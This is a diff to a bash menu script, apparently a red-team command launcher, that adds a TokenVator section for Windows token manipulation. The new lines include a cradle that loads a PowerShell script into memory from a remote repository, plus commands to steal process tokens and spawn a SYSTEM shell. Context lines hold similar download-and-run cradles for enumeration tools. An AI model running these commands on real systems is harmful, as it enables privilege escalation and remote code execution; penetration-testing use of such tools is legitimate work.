@@ -1222,14 +1222,14 @@ echo -ne " Select Token Manipulation tool Type
 
 
         1)  ->  [ Invoke-SharpImpersonation ${LYELLOW}WIP${RESTORE}]
-        2)  ->  [ Invoke-TokenManipulation  ${LYELLOW}WIP${RESTORE}]
+        2)  ->  [ Invoke-TokenVator  ${LYELLOW}WIP${RESTORE}]
         
         Q)  ->	[Previous Menu		]
 "
         read a
         case $a in
 	        1) 	Internal_Menu_Token_SharpImpersonation ;;
-	        2) 	Internal_Menu_Token_TokenManipulation ;;
+	        2) 	Internal_Menu_Token_TokenVator ;;
 	        q|Q)	Internal_Menu_Main ;;
 		0) exit 0 ;;
 		*) echo -e "Wrong option."
@@ -1255,15 +1255,15 @@ echo -e "Invoke-SharpImpersonation -Command "\"list\"""
 echo -e "Invoke-SharpImpersonation -Command "\"list wmi"\""
 echo -e ""
 echo -e "${IBLUE}Attempt to impersonate user with first process found${RESTORE}"
-echo -e "Invoke-SharpImpersonation -Command "\"user:SECURITY\\Administrator"\""
+echo -e "Invoke-SharpImpersonation -Command "\"user:[Domain\\User]"\""
 echo -e ""
 echo -e "${IBLUE}Inject directly into a process ID${RESTORE}"
 echo -e "Invoke-SharpImpersonation -Command "\"pid:[PID]"\""
 echo -ne "Get-Process -IncludeUserName | Select UserName, ProcessName, ID | Sort UserName" ; echo -e " ${YELLOW}# List PIDs and Users with PowerShell${RESTORE}"
 echo -e ""
 echo -e "${IBLUE}Impersonate first process of target user to a custom binary path${RESTORE}"
-echo -ne "Invoke-SharpImpersonation -Command "\"user:SECURITY\\Administrator binary:powershell.exe"\"" ; echo -e " ${YELLOW}# Start PowerShell${RESTORE}"
-echo -ne "Invoke-SharpImpersonation -Command "\"user:SECURITY\\Administrator binary:cmd.exe"\"" ; echo -e " ${YELLOW}# Start CMD${RESTORE}"
+echo -ne "Invoke-SharpImpersonation -Command "\"user:[Domain\\User] binary:powershell.exe"\"" ; echo -e " ${YELLOW}# Start PowerShell${RESTORE}"
+echo -ne "Invoke-SharpImpersonation -Command "\"user:[Domain\\User] binary:cmd.exe"\"" ; echo -e " ${YELLOW}# Start CMD${RESTORE}"
 echo -e ""
 echo -e ""
 echo -e ""
@@ -1283,6 +1283,53 @@ echo -ne  "Return to Previous Menu?
 
 }
 
+
+Internal_Menu_Token_TokenVator(){
+
+	clear
+    
+echo -e ""
+echo -e ""
+echo -e ""
+echo -e "${LGREEN}Invoke-TokenVator${RESTORE}"
+echo -e ""
+echo -e "${YELLOW}Load into memory${RESTORE}"
+echo -e "$DownloadMethod "$PowerSharpPackRepo"Invoke-TokenVator.ps1)"
+echo -e ""
+echo -e "${IBLUE}List tokens on current system (Sample)${RESTORE}"
+echo -e "Invoke-Tokenvator -Command "\"Sample_Processes\"""
+echo -e "Invoke-Tokenvator -Command "\"Sample_Processes_WMI\"""
+echo -e ""
+echo -e "${IBLUE}List user proceeses${RESTORE}"
+echo -e "Invoke-Tokenvator -Command "\"Find_User_Processes\"""
+echo -e "Invoke-Tokenvator -Command "\"Find_User_Processes_WMI\"""
+echo -ne "Get-Process -IncludeUserName | Select UserName, ProcessName, ID | Sort UserName" ; echo -e " ${YELLOW}# List PIDs and Users with PowerShell${RESTORE}"
+echo -e ""
+echo -e "${IBLUE}Steal token from process ID${RESTORE}"
+echo -e "Invoke-Tokenvator -Command "\"Steal_token [PID] powershell.exe\"""
+echo -e "Invoke-Tokenvator -Command "\"Steal_token [PID] cmd.exe\"""
+echo -e ""
+echo -e "${IBLUE}Spawn a SYSTEM shell${RESTORE}"
+echo -e "Invoke-Tokenvator -Command "\"GetSystem PowerShell.exe\"""
+echo -e "Invoke-Tokenvator -Command "\"GetSystem cmd.exe\"""
+echo -e ""
+echo -e ""
+echo -e ""
+
+echo -ne  "Return to Previous Menu?
+
+       
+        Q)  ->	[Previous Menu		    ]
+"
+
+        read a
+        case $a in
+        	q|Q)	Internal_Menu_Token ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+        
+}
 
 Internal_Menu_Recon_Local_Host(){
 
@@ -1305,6 +1352,7 @@ echo -e "$DownloadMethod "$EmpireRepo"situational_awareness/host/Invoke-WinEnum.
 echo -e ""
 echo -e "${IBLUE}JAWS${RESTORE}"
 echo -e "$DownloadMethod "$JAWSRepo"jaws-enum.ps1);JAWS-ENUM"
+echo -e ""
 echo -e ""
 echo -e ""
 
